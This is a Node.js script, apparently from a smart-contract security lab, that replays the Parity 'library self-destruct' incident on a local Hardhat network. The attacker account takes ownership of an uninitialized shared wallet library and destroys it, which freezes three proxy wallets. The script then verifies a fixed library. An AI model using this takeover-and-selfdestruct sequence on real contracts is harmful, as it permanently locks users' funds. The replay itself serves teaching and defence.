import { ethers } from "ethers";
import { artifact, assertEqual, assertOk, balance, deploy, eth, expectRevert, fmt, runtime, withLog } from "./lib.js";

await withLog("logs/parity2_freeze.log", async () => {
  console.log("# Parity Hack #2 / Library Self-Destruct");
  console.log("Network: Hardhat in-memory simulated network only. No live RPC or wallet used.");
  console.log("Simulation uses pre-Cancun Merge/Paris settings so SELFDESTRUCT removes library code for this historical replay.");

  const { provider, signers } = await runtime();
  const [deployer, owner, attacker] = signers;
  const ownerAddress = await owner.getAddress();
  const attackerAddress = await attacker.getAddress();

  const lib = await deploy("SharedWalletLibraryVulnerable", deployer);
  const libAsAttacker = lib.connect(attacker);
  const vulnerableAbi = artifact("SharedWalletLibraryVulnerable").abi;

  async function codeBytes(address) {
    const code = await provider.send("eth_getCode", [address, "latest"]);
    return (code.length - 2) / 2;
  }

  console.log(`SharedWalletLibraryVulnerable: ${await lib.getAddress()}`);
  console.log("Deploying three initialized SharedWallet proxies that point to the same library.");

  const wallets = [];
  for (let i = 1; i <= 3; i++) {
    const wallet = await deploy("SharedWallet", deployer, [await lib.getAddress(), [ownerAddress], 1], { value: eth(5) });
    wallets.push(wallet);
    const walletAsOwner = new ethers.Contract(await wallet.getAddress(), vulnerableAbi, owner);
    console.log(`Wallet ${i} proxy: ${await wallet.getAddress()}`);
    console.log(`Wallet ${i} owner initialized: ${await walletAsOwner.isOwner(ownerAddress)}`);
    console.log(`Wallet ${i} balance before freeze: ${fmt(await balance(provider, await wallet.getAddress()))}`);
    assertOk(await walletAsOwner.isOwner(ownerAddress), `Wallet ${i} legitimate owner initialized`);
    assertEqual(await balance(provider, await wallet.getAddress()), eth(5), `Wallet ${i} starts funded`, fmt);
  }
  console.log(`Library code bytes before kill: ${await codeBytes(await lib.getAddress())}`);

  await (await libAsAttacker.initWallet([attackerAddress], 1)).wait();
  console.log(`Attacker initialized the library's own storage as owner: ${await lib.isOwner(attackerAddress)}`);
  assertOk(await lib.isOwner(attackerAddress), "attacker owns the library's own storage after direct initWallet");
  await (await libAsAttacker.killLibrary()).wait();
  const libBytesAfterKill = await codeBytes(await lib.getAddress());
  console.log(`Library code bytes after kill: ${libBytesAfterKill}`);
  assertEqual(libBytesAfterKill, 0, "library code removed under historical selfdestruct replay");

  for (let i = 0; i < wallets.length; i++) {
    const wallet = wallets[i];
    const walletAsOwner = new ethers.Contract(await wallet.getAddress(), vulnerableAbi, owner);
    await expectRevert(`Wallet ${i + 1} owner cannot execute because shared library code is gone`, async () =>
      walletAsOwner.execute(ownerAddress, eth(1))
    );
    const walletAfter = await balance(provider, await wallet.getAddress());
    console.log(`Wallet ${i + 1} balance after failed execute: ${fmt(walletAfter)}`);
    assertEqual(walletAfter, eth(5), `Wallet ${i + 1} funds remain frozen, not stolen`, fmt);
  }
  console.log("Result: funds are frozen, not stolen. All three wallets still hold ETH, but delegatecall functionality is permanently unavailable because the shared target code is gone.");

  console.log("\n## Fixed shared library check");
  const fixedLib = await deploy("SharedWalletLibraryFixed", deployer);
  const fixedWallet = await deploy("SharedWallet", deployer, [await fixedLib.getAddress(), [ownerAddress], 1], { value: eth(5) });
  const fixedLibAsAttacker = fixedLib.connect(attacker);
  const fixedWalletAsOwner = new ethers.Contract(await fixedWallet.getAddress(), artifact("SharedWalletLibraryFixed").abi, owner);
  await expectRevert("attacker cannot initialize fixed library directly", async () =>
    fixedLibAsAttacker.initWallet([attackerAddress], 1)
  );
  await (await fixedWalletAsOwner.execute(ownerAddress, eth(1))).wait();
  const fixedAfter = await balance(provider, await fixedWallet.getAddress());
  console.log(`Fixed wallet balance after legitimate owner execute(): ${fmt(fixedAfter)}`);
  assertEqual(fixedAfter, eth(4), "fixed shared-library wallet remains usable by legitimate owner", fmt);
  console.log("Fixed result: library cannot be taken over directly, exposes no kill function, and the wallet remains usable.");
});
